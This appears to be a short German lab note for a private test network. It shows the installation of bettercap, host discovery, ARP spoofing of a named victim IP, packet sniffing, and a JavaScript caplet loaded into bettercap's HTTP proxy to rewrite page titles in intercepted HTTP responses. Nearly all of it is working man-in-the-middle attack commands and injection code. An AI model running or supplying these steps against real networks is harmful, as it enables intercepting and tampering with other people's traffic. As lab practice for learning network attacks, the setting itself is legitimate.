attacker=192.168.226.137
victim=192.168.226.138

host=192.168.226.2


sudo apt update
sudo apt install bettercap




$ sudo apt install bettercap
 liefert Fehlermeldung.
 
sudo apt install bettercap --fix-missing -y
 
das funktioniert
 
sudo bettercap

```
help
help net.probe
net.probe on
net.show
 
help net.recon
net.recon on
net.show

active
 
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.226.138
arp.spoof on

net.sniff on
```

```js
// Caplet: title_replace.cap
// Ersetzt den Titel jeder HTML-Seite (im Klartext über HTTP)

// Der neue Titel, der verwendet werden soll
var NEW_TITLE = "🚨 ManipulierT 🚨";

// Wird ausgeführt, wenn der HTTP-Proxy eine Antwort vom Server erhält
http.on('response', function(req, res) {
    // 1. Überprüfen, ob es eine Text-HTML-Antwort ist
    if (res.ContentType.indexOf('text/html') !== -1) {
        
        var body = res.Body.toString();
        
        // 2. Regulärer Ausdruck, um den alten Titel-Tag zu finden
        // Achtung: Der Ausdruck ist so gewählt, dass er nur den Inhalt des Tags ersetzt.
        // Der reguläre Ausdruck sucht nach <title>...</title>
        var titleRegex = /(<title>)(.*?)(<\/title>)/i;

        // 3. Den Titel ersetzen
        // $1 = alles vor dem alten Titel (<title>)
        // $3 = alles nach dem alten Titel (</title>)
        var newBody = body.replace(titleRegex, '$1' + NEW_TITLE + '$3');

        // 4. Den modifizierten Body zurück in die Antwort schreiben
        if (newBody !== body) {
            res.Body = newBody;
            res.ContentLength = newBody.length;
            // Optional: Logge die Modifikation für deine Konsole
            log('Titel ersetzt für Host: ' + req.Host);
        }
    }
});
```

```
set net.target 192.168.226.138
set http.proxy.caplet title_replace.cap
arp.spoof on
http.proxy on
net.sniff on
```






